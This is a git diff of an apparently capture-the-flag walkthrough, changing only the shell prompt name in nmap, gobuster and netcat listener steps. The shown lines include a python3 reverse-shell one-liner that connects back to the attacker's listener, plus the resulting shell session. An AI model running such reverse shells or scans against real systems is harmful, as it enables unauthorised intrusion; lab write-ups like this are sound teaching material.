@@ -1,7 +1,7 @@
 # enumerate
 ## nmap
 ```console
-kali@kali:~$ sudo python3 pymap.py -t 10.10.238.21
+bibo318@parrot:~$ sudo python3 pymap.py -t 10.10.238.21
 [sudo] password for kali: 
 created by gu2rks/kurohat 
 find me here https://github.com/gu2rks
@@ -40,7 +40,7 @@ Nmap done: 1 IP address (1 host up) scanned in 13.21 seconds
 # Port 80
 ## gobuster
 ```console
-kali@kali:~$ gobuster dir -u http://10.10.238.21/ -w /usr/share/SecLists/Discovery/Web-Content/big.txt -t 54 -x .php,.txt,.html
+bibo318@parrot:~$ gobuster dir -u http://10.10.238.21/ -w /usr/share/SecLists/Discovery/Web-Content/big.txt -t 54 -x .php,.txt,.html
 ===============================================================
 Gobuster v3.0.1
 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
@@ -164,13 +164,13 @@ clue.txt said `Look around the file system for the other ingredient.` the 2nd fl
 ```
 When I sudo, it dint give me back anything... like a jail shell. so I try to spawn a reverse shell with php
 ```console
-kali@kali:~$ nc -nlvp 1234
+bibo318@parrot:~$ nc -nlvp 1234
 listening on [any] 1234 ...
 connect to [10.8.14.151] from (UNKNOWN) [10.10.238.21] 39104
-kali@kali:~$ nc -nlvp 1234
+bibo318@parrot:~$ nc -nlvp 1234
 listening on [any] 1234 ...
 connect to [10.8.14.151] from (UNKNOWN) [10.10.238.21] 39106
-kali@kali:~$ nc -nvlp 1234
+bibo318@parrot:~$ nc -nvlp 1234
 ```
 it didnt works, the shell is terminated direcly. so I ran ```which python```, ```which python3``` to fine another way. python3 is installed in the server. now spawn reverse shell using the following cmd:
 ```py
@@ -178,7 +178,7 @@ python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SO
 ```
 it works
 ```console
-kali@kali:~$ nc -nvlp 1234
+bibo318@parrot:~$ nc -nvlp 1234
 listening on [any] 1234 ...
 connect to [10.8.14.151] from (UNKNOWN) [10.10.238.21] 39152
 /bin/sh: 0: can't access tty; job control turned off
